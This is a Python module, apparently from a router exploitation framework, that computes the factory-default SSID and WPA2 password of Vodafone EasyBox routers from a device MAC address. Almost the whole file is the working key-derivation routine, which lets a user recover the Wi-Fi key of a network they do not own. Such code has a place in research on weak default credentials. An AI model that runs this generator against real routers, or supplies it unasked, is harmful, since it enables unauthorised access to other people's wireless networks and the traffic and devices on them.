# Name:Vodafone Easybox Standard WPA2 Key Generator
# File:easybox_wpa2_keygen.py
# Author:Ján Trenčanský
# License: GNU GPL v3
# Created: 13.6.2015
# Last modified: 13.6.2015
# Shodan Dork:
# Description: Generates WPA2 Key for Vodafone easybox. Based on routerpwn.com easyboxwpa()

import core.Misc
import core.io
from interface.messages import print_success, print_error, print_help, print_info
from interface.utils import validate_mac, lookup_mac


class Misc(core.Misc.RextMisc):
    """
Name:Vodafone Easybox Standard WPA2 Key Generator
File:easybox_wpa2_keygen.py
Author:Ján Trenčanský
License: GNU GPL v3
Created: 13.6.2015
Description: Generates WPA2 Key for Vodafone easybox. Based on routerpwn.com easyboxwpa()

Options:
    Name        Description

    mac         MAC address used as input for WPA2 password generation
    """
    mac = "00:00:00:00:00"

    def __init__(self):
        core.Misc.RextMisc.__init__(self)

    def do_set(self, e):
        args = e.split(' ')
        if args[0] == "mac":
            if validate_mac(args[1]):
                self.mac = args[1]
                print_info("MAC set to: " + self.mac + " " + lookup_mac(self.mac))
            else:
                print_error("please provide valid MAC address")

    def do_mac(self, e):
        print_info(self.mac)

    def help_set(self):
        print_help("Set value of variable: \"set mac 00:11:22:33:44:55\"")

    def help_mac(self):
        print_help("Prints value of variable MAC")

    def do_run(self, e):
        mac = self.mac
        mac = mac.replace(":", "")
        mac = mac.replace("-", "")

        c1 = str(int(mac[8:], 16))

        while len(c1) < 5:
            c1 = "0" + c1

        s6 = int(c1[0], 16)
        s7 = int(c1[1], 16)
        s8 = int(c1[2], 16)
        s9 = int(c1[3], 16)
        s10 = int(c1[4], 16)
        m7 = int(mac[6], 16)
        m8 = int(mac[7], 16)
        m9 = int(mac[8], 16)
        m10 = int(mac[9], 16)
        m11 = int(mac[10], 16)
        m12 = int(mac[11], 16)

        k1 = (s7 + s8 + m11 + m12) & 0x0F
        k2 = (m9 + m10 + s9 + s10) & 0x0F

        x1 = k1 ^ s10
        x2 = k1 ^ s9
        x3 = k1 ^ s8
        y1 = k2 ^ m10
        y2 = k2 ^ m11
        y3 = k2 ^ m12
        z1 = m11 ^ s10
        z2 = m12 ^ s9
        z3 = k1 ^ k2

        ssid = "EasyBox-" + format(m7, 'x') + format(m8, 'x') + format(m9, 'x') \
               + format(m10, 'x') + format(s6, 'x') + format(s10, 'x')

        wpakey = format(x1, 'x') + format(y1, 'x') + format(z1, 'x') + \
                 format(x2, 'x') + format(y2, 'x') + format(z2, 'x') + \
                 format(x3, 'x') + format(y3, 'x') + format(z3, 'x')

        print_success("WPA2 key generated")
        print("SSID:" + ssid)
        print("WPA2KEY:" + wpakey.upper())


Misc()
